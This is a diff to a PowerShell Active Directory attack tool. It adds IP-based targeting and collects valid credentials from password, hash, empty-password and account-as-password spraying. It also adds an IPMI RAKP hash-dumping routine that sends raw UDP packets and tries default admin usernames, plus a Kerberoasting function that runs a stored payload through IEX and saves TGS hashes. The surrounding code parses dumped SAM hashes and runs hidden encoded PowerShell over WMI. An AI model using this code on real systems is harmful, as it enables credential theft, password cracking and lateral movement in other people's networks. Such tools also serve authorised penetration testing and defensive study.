-                        Write-Host ("{0,-16}" -f $IP) -NoNewline
+     
+                    if (!$IPAddress) {
+                        # Resolve IP
+                        $IP = $null
+                        $Ping = New-Object System.Net.NetworkInformation.Ping
+                        $Result = $Ping.Send($ComputerName, 15)
+                        if ($Result.Status -eq 'Success') {
+                            $IP = $Result.Address.IPAddressToString
+                            Write-Host ("{0,-16}" -f $IP) -NoNewline
+                        }
+                        else {
+                            Write-Host ("{0,-16}" -f $IP) -NoNewline
+                        }
                     }
-                    else { Write-Host ("{0,-16}" -f $IP) -NoNewline }
-    
+                    elseif ($IPAddress) {
+                        Resolve-DnsNameWithTimeout -IPAddress $ComputerName -Timeout 5000
+                    }
+
+                    # IP Address in use, display nothing in column
+                    else {}
+
                     # Display ComputerName and OS
                     Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
                     Write-Host "   " -NoNewline
-                    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
+                    if (!$IPAddress) { Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline }
                     Write-Host "   " -NoNewline
 
                     # Display status symbol and text
                     Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
                     Write-Host $statusText
                 }
-
 
                 if ($LocalAuth) { $Domain = $ComputerName }
                 if ($Password -ne "") { $result = Invoke-RDP "username=$Domain\$Username password=$Password computername=$ComputerName" }
@@ -2829,6 +3256,9 @@ while (`$true) {
 
                     { $SuccessStatus -contains $_ } {
                         Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+                        if ($LocalAuth) { $Username = "$Username (Local Account)" }
+                        if (-not (Test-Path -Path "$RDP\$Username.txt")) { New-Item -Path "$RDP\$Username.txt" -ItemType "File" -Force | Out-Null }
+                        $ComputerName | Out-File -FilePath "$RDP\$Username.txt" -Encoding ASCII -Append
                         continue
                     }
 
@@ -2841,11 +3271,17 @@ while (`$true) {
                     { $PwChangeStatus -contains $_ } {
                         if ($SuccessOnly) { continue }
                         Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Magenta" -statusSymbol "[/] " -statusText "PASSWORD CHANGE REQUIRED" -NameLength $NameLength -OSLength $OSLength
+                        if ($LocalAuth) { $Username = "$Username (Local Account)" }
+                        if (-not (Test-Path -Path "$RDP\$Username.txt")) { New-Item -Path "$RDP\$Username.txt" -ItemType "File" -Force | Out-Null }
+                        $ComputerName + "(Password Change Required)" | Out-File -FilePath "$RDP\$Username.txt" -Encoding ASCII -Append
                         continue
                     }
 
                     { $ToDStatus -contains $_ } {
                         Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS - ACCOUNT RESTRICTION" -NameLength $NameLength -OSLength $OSLength
+                        if ($LocalAuth) { $Username = "$Username (Local Account)" }
+                        if (-not (Test-Path -Path "$RDP\$Username.txt")) { New-Item -Path "$RDP\$Username.txt" -ItemType "File" -Force | Out-Null }
+                        $ComputerName + "(Account Restriction)" | Out-File -FilePath "$RDP\$Username.txt" -Encoding ASCII -Append
                         continue
                     }
 
@@ -2857,14 +3293,13 @@ while (`$true) {
                 }
    
 
-
             }
 
             while (($RDPJobs | Where-Object { $_.State -eq 'Running' }).Count -ge $MaxConcurrentJobs) {
                 Start-Sleep -Milliseconds 100
             }
 
-            $RDPJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $OS, $ComputerName, $Domain, $Username, $Password, $NameLength, $OSLength, $LocalAuth, $SuccessOnly, $Global:irdp
+            $RDPJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $OS, $ComputerName, $Domain, $Username, $Password, $NameLength, $OSLength, $LocalAuth, $SuccessOnly, $Global:irdp, $IPAddress, $RDP
             [array]$RDPJobs += $RDPJob
 
             # Check if the maximum number of concurrent jobs has been reached
@@ -2909,6 +3344,7 @@ while (`$true) {
 
         # Clean up all remaining jobs
         $RDPJobs | Remove-Job -Force -ErrorAction "SilentlyContinue"
+        if (Test-Path -Path "$RDP\$Username.txt") { Get-Content -Path "$RDP\$Username.txt" | Select-Object -Unique | Set-Content -Path "$RDP\$Username.txt" }
     }
 
     ################################################################################################################
@@ -3095,12 +3531,18 @@ while (`$true) {
 
         }
 
-
         # Create and invoke runspaces for each computer
         foreach ($computer in $computers) {
 
-            $ComputerName = $computer.Properties["dnshostname"][0]
-            $OS = $computer.Properties["operatingSystem"][0]
+            if (!$IPAddress) {
+                $ComputerName = $computer.Properties["dnshostname"][0]
+                $OS = $computer.Properties["operatingSystem"][0]
+            }
+
+            elseif ($IPAddress) {
+                $ComputerName = "$Computer"
+                $OS = "OS:PLACEHOLDER"
+            }
     
             $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Timeout)
             $runspace.RunspacePool = $runspacePool
@@ -3172,7 +3614,6 @@ while (`$true) {
  
     }
 
-
     ################################################################################################################
     ############################################ Function: SessionHunter ###########################################
     ################################################################################################################
@@ -3180,7 +3621,6 @@ while (`$true) {
         Write-host
 
         Remove-Item -Path "$Sessions\SH-MatchedGroups-$Domain.txt" -Force -ErrorAction "SilentlyContinue"
-
 
         # Create a runspace pool
         $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
@@ -3214,7 +3654,6 @@ while (`$true) {
             $osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue"
             if (!$osInfo) { return }
 
-
             Function WMI {
 
                 param (
@@ -3222,7 +3661,6 @@ while (`$true) {
                     [string]$ComputerName,
                     [string]$Class = "PMEClass"
                 )
-
 
                 function CreateScriptInstance([string]$ComputerName) {
                     $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2"
@@ -3253,7 +3691,6 @@ while (`$true) {
                     catch { Write-Error $_.Exception.Message } 
                     finally { if ($wmiInstance) { $wmiInstance.Dispose() } }
                 }
-
 
                 function ExecCommand([string]$ComputerName, [string]$Command) {
                     $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command
@@ -3386,7 +3823,6 @@ while (`$true) {
 
         }
 
-
         # Create and invoke runspaces for each computer
         foreach ($computer in $computers) {
 
@@ -3504,12 +3940,9 @@ while (`$true) {
             Start-Sleep -Milliseconds 100
         } while ($runspaces | Where-Object { -not $_.Completed })
 
-
-
         # Clean up
         $runspacePool.Close()
         $runspacePool.Dispose()
-
 
     }
 
@@ -3596,7 +4029,6 @@ while (`$true) {
 
         }
 
-
         if ($AccountAsPassword) {
             $SprayHash = ""
             $SprayPassword = ""
@@ -3618,7 +4050,8 @@ while (`$true) {
             Write-Host
         }
 
-
+        
+        $SuccessUsers = @()
         foreach ($UserToSpray in $EnabledDomainUsers) {
             $Delay = Get-Random -Minimum 5 -Maximum 20
             Start-Sleep -Milliseconds $Delay
@@ -3672,18 +4105,27 @@ while (`$true) {
                     elseif ($Attempt.IndexOf("NameService              :") -ne -1) {
                         Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                         Write-Host "$Domain\$UserToSpray"
+
+                        $SuccessfulUser = "$Domain\$UserToSpray"
+                        $SuccessUsers += $SuccessfulUser
+                        
                         "$Domain\${UserToSpray}:$SprayHash" | Out-file -FilePath "$Spraying\$Domain-Hashes-Users.txt" -Encoding "ASCII" -Append
                     }
                 }
 
                 # Password Spraying
                 if ($SprayPassword -ne "") {
-
+                    
+                    
                     $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain", $UserToSpray, $SprayPassword)
         
                     if ($Attempt.name -ne $null) {
                         Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                         Write-Host "$Domain\$UserToSpray"
+                        
+                        $SuccessfulUser = "$Domain\$UserToSpray"
+                        $SuccessUsers += $SuccessfulUser
+                        
                         "$Domain\${UserToSpray}:$SprayPassword" | Out-file -FilePath "$Spraying\$Domain-Password-Users.txt" -Encoding "ASCII" -Append
                     }
 
@@ -3691,10 +4133,7 @@ while (`$true) {
                         Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                         Write-Host "$Domain\$UserToSpray"
                     }
-    
                 }
-
-
                 # Account as password
                 if ($AccountAsPassword) {
 
@@ -3703,6 +4142,10 @@ while (`$true) {
                     if ($Attempt.name -ne $null) {
                         Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                         Write-Host "$Domain\$UserToSpray"
+                        
+                        $SuccessfulUser = "$Domain\$UserToSpray"
+                        $SuccessUsers += $SuccessfulUser
+                        
                         "$Domain\${UserToSpray}:$UserToSpray" | Out-file -FilePath "$Spraying\$Domain-AccountAsPassword-Users.txt" -Encoding "ASCII" -Append
                     }
 
@@ -3713,7 +4156,6 @@ while (`$true) {
     
                 }
 
-
                 # EmptyPasswords
                 if ($EmptyPassword) {
                     $password = ""
@@ -3723,6 +4165,10 @@ while (`$true) {
                     if ($Attempt.name -ne $null) {
                         Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                         Write-Host "$Domain\$UserToSpray"
+                        
+                        $SuccessfulUser = "$Domain\$UserToSpray"
+                        $SuccessUsers += $SuccessfulUser
+                        
                         "$Domain\${UserToSpray}" | Out-file -FilePath "$Spraying\$Domain-EmptyPassword-Users.txt" -Encoding "ASCII" -Append
                     }
 
@@ -3739,6 +4185,40 @@ while (`$true) {
         
             }
         }
+
+        
+        if ($SuccessUsers.Count -gt 0 ) {
+            Write-Host
+            Write-Host
+            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+            Write-Host "Valid credential pairs found: " -NoNewline
+            Write-Host $SuccessUsers.Count
+            if (!$SuccessOnly) { Write-Host } Else {}
+
+            if (!$SuccessOnly) {
+                foreach ($User in $SuccessUsers) {
+                    Write-Host "[+] " -ForegroundColor "Green" -NoNewline
+                    Write-Host "$User"
+                
+                }
+            }
+            
+            if (!$SuccessOnly) { Write-Host } Else {}
+            Write-Host "[*] " -ForegroundColor "Yellow" -no
+            Write-Host "Output written to $Spraying"
+            Write-Host
+        }
+
+        elseif ($SuccessUsers.Count -eq 0 ) {
+            Write-Host
+            Write-Host
+            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+            Write-Host "No valid credential pairs found"
+            Write-Host
+        }
+ 
+ 
+ 
     }
 
     ################################################################################################################
@@ -3772,7 +4252,6 @@ while (`$true) {
             else {
                 $connected = $false
             }
-
 
             if (!$connected) { $tcpClient.Close() ; return }
 
@@ -3899,7 +4378,6 @@ while (`$true) {
         $runspacePool.Close()
         $runspacePool.Dispose()
 
-
     }
 
     ################################################################################################################
@@ -3909,14 +4387,13 @@ while (`$true) {
 
         Add-Type -AssemblyName "System.Data"
 
-
         # Create a runspace pool
         $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
         $runspacePool.Open()
         $runspaces = New-Object System.Collections.ArrayList
 
         $scriptBlock = {
-            param ($ComputerName, $MSSQL)
+            param ($ComputerName, $MSSQL, $IPAddress)
 
             function Send-UdpDatagram {
                 param ([string]$ComputerName)
@@ -3937,7 +4414,6 @@ while (`$true) {
                 finally {
                     try { $client.close() } Catch {}
                 }
-
 
                 $rawData = [text.encoding]::ascii.getstring($receive)
                 $instanceFullNames = @()
@@ -3966,7 +4442,7 @@ while (`$true) {
                 $ComputerName = $Computer
             }
 
-            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Port).AddArgument($MSSQL).AddArgument($timeout)
+            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Port).AddArgument($MSSQL).AddArgument($timeout).AddArgument($IPAddress)
             $runspace.RunspacePool = $runspacePool
 
             [void]$runspaces.Add([PSCustomObject]@{
@@ -4035,7 +4511,6 @@ while (`$true) {
         }
 
         if (!$IPAddress) { $AllInstances = Get-ADSQLInstances }
-
 
         # Poll the runspaces and display results as they complete
         do {
@@ -4129,7 +4604,6 @@ while (`$true) {
             Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
             Write-Host $statusText
         }
-
 
         $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
         $runspacePool.Open()
@@ -4252,7 +4726,6 @@ public class Advapi32 {
                     [Parameter(Mandatory = $false)]
                     [string]$Password
                 )
-
 
                 try {
                     # Create and open a SQL connection
@@ -4404,7 +4877,6 @@ public class Advapi32 {
                 }
             }
 
-
             function Test-SqlConnection {
                 [CmdletBinding()]
                 param (
@@ -4466,7 +4938,6 @@ public class Advapi32 {
         }
 
         foreach ($NamedInstance in $AllInstances) {
-
 
     
             $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($NamedInstance).AddArgument($Username).AddArgument($Password).AddArgument($LocalAuth).AddArgument($Domain).AddArgument($Command)
@@ -4554,7 +5025,6 @@ public class Advapi32 {
             Start-Sleep -Milliseconds 100
         } while ($runspaces | Where-Object { -not $_.Completed })
 
-
         # Clean up
         $runspacePool.Close()
         $runspacePool.Dispose()
@@ -4571,7 +5041,6 @@ public class Advapi32 {
             Set-Content -Path $AccessibleFilePath
         }
 
-
     }
 
     ################################################################################################################
@@ -4584,7 +5053,7 @@ public class Advapi32 {
         $runspaces = New-Object System.Collections.ArrayList
 
         $scriptBlock = {
-            param ($computerName, $Domain, $Timeout)
+            param ($computerName, $Domain, $Timeout, $IPAddress)
 
             Function Test-Port {
                 param ($ComputerName, $Port)
@@ -4610,7 +5079,6 @@ public class Advapi32 {
             $WinRMPort = Test-Port -ComputerName $ComputerName -Port 5985
             $WMIPort = Test-Port -ComputerName $ComputerName -Port 135
             $SMBPort = Test-Port -ComputerName $ComputerName -Port 445
-
 
             # if all three fail, return and kill the runspace
             if (-not $SMBPort -and -not $WMIPort -and -not $WinRMPort) {
@@ -4642,6 +5110,26 @@ public class Advapi32 {
             # WinRM Check
             if ($WinRMPort) {
                 try {
+
+                    if ($IPAddress) {
+                        # Define the function before using it
+                        function Resolve-IPToDNSName {
+                            param (
+                                [string]$IPAddress
+                            )
+                            try {
+                                $hostEntry = [System.Net.Dns]::GetHostEntry($IPAddress)
+                                return $hostEntry.HostName
+                            }
+                            catch {
+                                return "Unable to resolve"
+                            }
+                        }
+
+                        # Use the function to resolve DNS Name
+                        $ComputerName = Resolve-IPToDNSName -IPAddress $ComputerName
+                    }
+
                     Invoke-Command -ComputerName $computerName -ScriptBlock { echo "Successful Connection PME" } -ErrorAction Stop
                     $WinRMAccess = $True
                 }
@@ -4677,7 +5165,7 @@ public class Advapi32 {
                 $OS = "OS:PLACEHOLDER"
             }
 
-            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Domain).AddArgument($Timeout)
+            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Domain).AddArgument($Timeout).AddArgument($IPAddress)
             $runspace.RunspacePool = $runspacePool
 
             [void]$runspaces.Add([PSCustomObject]@{
@@ -4722,6 +5210,349 @@ public class Advapi32 {
         # Clean up
         $runspacePool.Close()
         $runspacePool.Dispose()
+    }
+
+    ################################################################################################################
+    ################################################ Function: All #################################################
+    ################################################################################################################
+    Function Method-IPMI {
+     
+        $Global:DisplayedIPMIUserCount = $False
+        
+        function Send-Receive {
+            [CmdletBinding()]
+            param (
+                [Parameter(Mandatory = $true)]
+                [ValidateNotNull()]
+                [System.Net.Sockets.UdpClient]$Sock,
+
+                [Parameter(Mandatory = $true)]
+                [ValidateNotNullOrEmpty()]
+                [string]$IP,
+
+                [Parameter(Mandatory = $true)]
+                [ValidateNotNull()]
+                [Byte[]]$Data,
+
+                [Parameter(Mandatory = $true)]
+                [ValidateRange(1, 65535)]
+                [int]$Port
+            )
+
+            $remoteEP = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($IP), $Port)
+            $receivedBytes = $Sock.Send($Data, $Data.Length, $remoteEP)
+            $receiveBytes = $Sock.Receive([ref]$remoteEP)
+            return $receiveBytes
+        }
+
+        function Test-IP {
+            param (
+                [Parameter(Mandatory = $true)]
+                [ValidateNotNullOrEmpty()]
+                [string]$IP,
+
+                [Parameter(Mandatory = $true)]
+                [ValidateNotNull()]
+                [Byte[]]$SessionID,
+
+                [Parameter(Mandatory = $true)]
+                [ValidateNotNull()]
+                [System.Net.Sockets.UdpClient]$Sock,
+
+                [Parameter(Mandatory = $true)]
+                [ValidateRange(1, 65535)]
+                [int]$Port
+            )
+
+            $attemptLimit = 3
+            $attemptCount = 0
+
+            while ($attemptCount -lt $attemptLimit) {
+
+                $data = 0x06, 0x00, 0xff, 0x07
+                $data += 0x06, 0x10, 0x00, 0x00
+                $data += 0x00, 0x00, 0x00, 0x00
+                $data += 0x00, 0x00, 0x20, 0x00
+                $data += 0x00, 0x00, 0x00, 0x00
+                $data += $SessionID
+                $data += 0x00, 0x00, 0x00, 0x08
+                $data += 0x01, 0x00, 0x00, 0x00
+                $data += 0x01, 0x00, 0x00, 0x08
+                $data += 0x01, 0x00, 0x00, 0x00
+                $data += 0x02, 0x00, 0x00, 0x08
+                $data += 0x01, 0x00, 0x00, 0x00
+
+                try {
+                    $sResponse1 = Send-Receive -Sock $Sock -IP $IP -Data $data -Port $Port
+                    return $sResponse1
+                }
+
+                catch [System.Net.Sockets.SocketException] {
+                    Write-Verbose "[S] $IP does not have IPMI/RMCP+ running or is not vulnerable (Attempt $attemptCount)(User=$User)"
+                    $attemptCount++
+
+                    if ($attemptCount -eq $attemptLimit) {
+                        if ($SuccessOnly) { $Sock.close ; return -111 }
+                        Display-ComputerStatus -ComputerName $ComputerName -statusColor "Red" -statusSymbol "[-] " -statusText "IPMI not running or vulnerable" -NameLength 16
+                        $Sock.Close()
+                        return -111
+                    }
+                }
+            }
+        }
+
+        function Attempt-Retrieve {
+            param (
+                [Parameter(Mandatory = $true)]
+                [ValidateNotNullOrEmpty()]
+                [string]$User,
+
+                [Parameter(Mandatory = $true)]
+                [ValidatePattern('^\d{1,3}(\.\d{1,3}){3}$')] 
+                [string]$IP,
+
+                [Parameter(Mandatory = $true)]
+                [ValidateRange(1, 65535)]
+                [int]$Port
+            )
+    
+            $attemptLimit = 3
+            $attemptCount = 0
+            $IPMISuccess = $False
+
+            while ($attemptCount -lt $attemptLimit) {
+
+                $rSessionID = (30..90) + (97..122) | Get-Random -Count 4 | % { [Byte[]]$_ }
+                $sock = New-Object System.Net.Sockets.UdpClient
+                $sock.Client.ReceiveTimeout = 250
+
+                $tResponse = Test-IP -IP $IP -SessionID $rSessionID -Port $Port -Sock $sock
+                if ($tResponse -eq -111) {
+                    $sock.Close()
+                    return -111
+                }
+
+                if ($tResponse.Length -gt 0) {
+
+                    $rRequestSALT = (30..90) + (97..122) | Get-Random -Count 16 | % { [Byte[]]$_ }
+                    $sUserLength1 = [Byte]($User.Length + 28), 0x00
+                    $sUserLength2 = [Byte]$User.Length
+                    $sHexUser = [System.Text.Encoding]::ASCII.GetBytes($User)
+                    $rRequestID = $tResponse[24..27]
+
+                    $data = 0x06, 0x00, 0xff, 0x07
+                    $data += 0x06, 0x12
+                    $data += 0x00, 0x00, 0x00, 0x00
+                    $data += 0x00, 0x00, 0x00, 0x00
+                    $data += $sUserLength1
+                    $data += 0x00, 0x00, 0x00, 0x00
+                    $data += $rRequestID  
+                    $data += $rRequestSALT
+                    $data += 0x14, 0x00, 0x00
+                    $data += $sUserLength2
+                    $data += $sHexUser
+
+        
+                    try {
+                        $sResponse1 = Send-Receive -Sock $sock -IP $IP -Data $data -Port $Port
+                        $iMessageLength = $sResponse1[14]
+                        if ($sResponse1[17] -eq 18) {
+                            #Write-Host "[-] Invalid username: $User"
+                            return
+                        }
+                        if ($iMessageLength -eq 60) {
+
+                            $sResponseData = $sResponse1[24..$sResponse1.Length]
+
+                            if (($sResponseData.Length * 2) -eq (($iMessageLength - 8) * 2)) {
+                                $global:IPMI_halt = $true
+                                $rSessionIDHex = ($rSessionID | ForEach-Object ToString X2) -join ''
+                                $rRequestIDHex = ($rRequestID | ForEach-Object ToString X2) -join ''
+                                $rResponseSALTHex = ($sResponseData[0..31] | ForEach-Object ToString X2) -join ''
+                                $rResponseHashHex = ($sResponseData[32..$sResponseData.Length] | ForEach-Object ToString X2) -join ''
+                                $sUserLength2Hex = ($sUserLength2 | ForEach-Object ToString X2) -join ''
+                                $sHexUserHex = ($sHexUser | ForEach-Object ToString X2) -join ''
+                                $rRequestSALTHex = ($rRequestSALT | ForEach-Object ToString X2) -join ''
+                                $Hash = $rSessionIDHex + $rRequestIDHex + $rRequestSALTHex + $rResponseSALTHex + '14' + $sUserLength2Hex + $sHexUserHex + ':' + $rResponseHashHex
+                                $Hash = $Hash.ToLower()
+                                $IPMISuccess = $True
+                                
+                                Write-Host
+                                Display-ComputerStatus -ComputerName $ComputerName -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength 16
+                                Write-Host
+                                $User + ":" + $Hash | Write-Host
+                                
+                                if (-not (Test-Path -Path "$IPMI\.IPMI-All.txt")) { New-Item -Path "$IPMI" -Name ".IPMI-All.txt" -ItemType "File" -Force }
+                                if (-not (Test-Path -Path "$IPMI\$ComputerName.txt")) { New-Item -Path "$IPMI" -Name "$ComputerName.txt" -ItemType "File" -Force }
+                                
+                                if (-not (Get-Content "$IPMI\$ComputerName.txt" | Select-String -Pattern "^${User}:")) { $User + ":" + $Hash | Out-File -Encoding "ASCII" -Append -FilePath "$IPMI\$ComputerName.txt" }
+                                if (-not (Get-Content "$IPMI\.IPMI-All.txt" | Select-String -Pattern "\[${ComputerName}\]${User}")) { "[" + $ComputerName + "]" + $User + ":" + $Hash | Out-File -Encoding "ASCII" -Append -FilePath "$IPMI\.IPMI-All.txt" }
+
+                                Write-Host
+                                
+                                $attemptCount = 3
+                            }
+
+                        }
+                        else {
+                            $sock.Close()
+                            return
+                        }
+
+                    }
+                    catch {
+                        # Error AR
+            
+                        $attemptCount ++
+                        Write-Verbose "[A] Trying user again (Attempt=$AttemptCount)(User=$User)"
+                        $sock.Close()
+                    }
+
+                    finally {
+                        $sock.Close()
+    
+                    }
+                }
+            }
+    
+            if ($IPMISuccess) {
+
+                Get-Content -Path "$IPMI\.IPMI-All.txt" | Get-Unique | Set-Variable -Name IPMIUniqueContent
+                $IPMIUniqueContent | Set-Content -Path "$IPMI\.IPMI-All.txt" -Force
+    
+            }
+        }
+
+        function Invoke-IPMIDump {
+            [CmdletBinding(DefaultParameterSetName = 'Default')]
+            Param(
+                [Parameter(Mandatory = $false)]
+                [string]$Users,
+
+                [Parameter(Mandatory = $true)]
+                [string]$IP,
+
+                [Parameter(Mandatory = $false)]
+                [string]$Option, 
+
+                [Parameter()]
+                [int]$Port = 623
+            )
+
+            if (![System.Net.Dns]::GetHostAddresses("$IP")) {
+                return "Unable to resolve DNS Name"
+            }
+
+            if ($Option -eq "IPMI:DomainUsers") {
+                Write-Verbose "[IPMI] Using domain users as a user list"
+    
+                $IPMIUsers = $EnabledDomainUsers
+            } 
+
+            else {
+                Write-Verbose "[IPMI] Using built in user list"
+    
+                $IPMIUsers = @(
+                    "Admin", "admin", "administrator", "ADMIN", "root", "USERID",
+                    "ipmiadmin", "superuser", "operator", "service", "support",
+                    "guest", "default", "system", "remote", "supervisor", "tech",
+                    "Administrator", "manager", "test"
+                )
+            }
+
+            if (!$Global:DisplayedIPMIUserCount) {
+    
+                Write-Host "[*] " -ForegroundColor Yellow -NoNewline
+                Write-Host "Trying $($IPMIUsers.count) usernames against any identified IPMI candidates"
+                Write-Host
+                Start-Sleep -Seconds 3
+                $Global:DisplayedIPMIUserCount = $true
+    
+            }
+
+            $global:IPMI_halt = $false
+            foreach ($user in $IPMIUsers) {
+                if ($global:IPMI_halt) { break }
+                $res = Attempt-Retrieve -User $user -Port $Port -IP $IP
+                if ($res -eq -111) {
+                    break
+                }
+            }
+        }
+
+        foreach ($computer in $computers) {
+
+            if (!$IPAddress) {
+                $ComputerName = $computer.Properties["dnshostname"][0]
+                $OS = $computer.Properties["operatingSystem"][0]
+            }
+
+            elseif ($IPAddress) {
+                $ComputerName = "$Computer"
+                $OS = "OS:PLACEHOLDER"
+            }
+
+            Invoke-IPMIDump -IP $computer -Option $Option
+
+        }
+        
+    }
+
+    ################################################################################################################
+    ################################################ Function: Kerberoast ##########################################
+    ################################################################################################################
+    function Method-Kroast {
+        IEX $Global:rst
+
+        if ($Option -like "Kerberoast:*") {
+            $SplitUser = $Option.Split(':')[1]
+            $RoastOutput = Invoke-Kroast /domain:$Domain /user:$SplitUser | Out-String
+        }
+        else {
+            $RoastOutput = Invoke-Kroast /domain:$Domain | Out-String
+        }
+
+        if ($RoastOutput -eq "None Found") {
+            Write-Host "[-] No candidate user accounts found" -ForegroundColor Red
+            return
+        }
+
+        if ($ShowOutput) { $RoastOutput }
+
+        $currentDateTime = Get-Date -Format "yyyyMMdd_HHmmss"
+        $type18FilePath = Join-Path -Path $Kerberoast -ChildPath "type-18_$currentDateTime.txt"
+        $type23FilePath = Join-Path -Path $Kerberoast -ChildPath "type-23_$currentDateTime.txt"
+
+        function AppendBlob {
+            param (
+                [string]$blobData,
+                [string]$filePath
+            )
+            Add-Content -Path $filePath -Value $blobData
+            Add-Content -Path $filePath -Value "`n"
+        }
+
+        $RoastOutput -split "`n" | ForEach-Object {
+            $line = $_.Trim()
+        
+            if ($line.StartsWith("User")) {
+                $user = $line -replace "User\s+:\s+", ""
+                Write-Host "[+] " -ForegroundColor "Green" -NoNewline
+                Write-Host "$($Domain.ToUpper())\$user"
+            }
+
+            if ($line.Contains('$krb5tgs$18$')) {
+                AppendBlob -blobData $line -filePath $type18FilePath
+            }
+            elseif ($line.Contains('$krb5tgs$23$')) {
+                AppendBlob -blobData $line -filePath $type23FilePath
+            }
+        }
+
+        Write-Host
+        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline 
+        Write-Host "Output written to $Kerberoast"
+        Write-Host
     }
 
     ################################################################################################################
@@ -4812,7 +5643,6 @@ public class Advapi32 {
             return $hashEntries
         }
 
-
         $NTLMpwURL = "https://ntlm.pw/" 
 
         $parsedData = switch ($Module) {
@@ -4891,9 +5721,9 @@ public class Advapi32 {
     ################################################## Function: Parse-SAM #########################################
     ################################################################################################################
     function Parse-SAM {
-        $SamFull = Test-Path -Path "$PME\SAM\.Sam-Full.txt"
+        $SamFull = Test-Path -Path "$PME\SAM\.SAM-Full.txt"
         if (-not $SamFull) {
-            New-Item -Path "$PME\SAM\" -Name ".Sam-Full.txt" -ItemType "File" | Out-Null
+            New-Item -Path "$PME\SAM\" -Name ".SAM-Full.txt" -ItemType "File" | Out-Null
         }
 
         $files = Get-ChildItem -Path "$SAM\*" -Filter "*-SAMHashes.txt"
@@ -4909,30 +5739,35 @@ public class Advapi32 {
 
                 $lineParts = $line -split ':'
                 $lineWithoutNumber = $lineParts[0] + ':' + $lineParts[2] + ':' + $lineParts[3] + ':' + $lineParts[4]
-                $computer = $file.BaseName -split '\.' | Select-Object -First 1
-                $computerFormed = "{0}" -f $computer
-
-                if ($lines.ContainsKey($lineWithoutNumber)) {
-                    $lines[$lineWithoutNumber] += "," + $computerFormed
+            
+                $baseName = $file.BaseName
+                $computerOrIP = if ($baseName -match '^(?<ip>\d{1,3}(\.\d{1,3}){3})') {
+                    $matches['ip']
                 }
                 else {
-                    $lines[$lineWithoutNumber] = $computerFormed
+                    $baseName -split '\.' | Select-Object -First 1
+                }
+
+                if ($lines.ContainsKey($lineWithoutNumber)) {
+                    $lines[$lineWithoutNumber] += "," + $computerOrIP
+                }
+                else {
+                    $lines[$lineWithoutNumber] = $computerOrIP
                 }
             }
         }
 
         $duplicateLines = $lines.GetEnumerator() | Where-Object { $_.Value -match ',' }
         if ($duplicateLines) {
-        
             Write-Host
             Write-Host
             Write-Host "------------------------- Hashes which are valid on multiple computers -------------------------" -ForegroundColor "Yellow"
             Write-Host
-        
+    
             foreach ($duplicate in $duplicateLines) {
                 $line = $duplicate.Key
                 $computers = $duplicate.Value -split ','
-            
+        
                 Write-Host "Computers: $($computers -join ', ')" -ForegroundColor "Yellow"
                 Write-Host "$line::"
                 Write-Host
@@ -4944,32 +5779,37 @@ public class Advapi32 {
         Write-Host
 
         Get-ChildItem -Path "$SAM\*" -Filter "*-SAMHashes.txt" | Where-Object { $_.Length -gt 0 } | ForEach-Object {
-            $Computer = $_.BaseName -split '\.' | Select-Object -First 1
-            $ComputerFormed = "[{0}]" -f $Computer
+            $baseName = $_.BaseName
+            $ComputerOrIP = if ($baseName -match '^(?<ip>\d{1,3}(\.\d{1,3}){3})') {
+                $matches['ip']
+            }
+            else {
+                $baseName -split '\.' | Select-Object -First 1
+            }
+            $ComputerFormed = "[{0}]" -f $ComputerOrIP
             $keywords = 'Guest', 'WDAGUtilityAccount', 'DefaultAccount'
             $content = Get-Content $_.FullName -Verbose
             $output = foreach ($line in $content) {
                 $trimmedLine = $line.Trim()
-                if ($trimmedLine -notmatch ($keywords -join '|') -and $trimmedLine.Length -gt $ComputerFormed.Length) {
+                if ($trimmedLine -notmatch ($keywords -join '|') -and $trimmedLine.Length -gt 0) {
                     $ComputerFormed + $trimmedLine
                 }
             }
-            $output | Out-File "$SAM\.Sam-Full.txt" -Force "ascii" -Append
+            $output | Out-File "$SAM\.SAM-Full.txt" -Force "ascii" -Append
         }
 
-        Start-Sleep -Seconds "3"
-    (Get-Content "$SAM\.Sam-Full.txt") | Sort-Object -Unique | Sort-Object | Out-File "$SAM\.Sam-Full.txt" -Encoding "ASCII"
-        Get-Content "$SAM\.Sam-Full.txt"
+        Start-Sleep -Seconds 3
+    (Get-Content "$SAM\.SAM-Full.txt") | Sort-Object -Unique | Sort-Object | Out-File "$SAM\.SAM-Full.txt" -Encoding "ASCII"
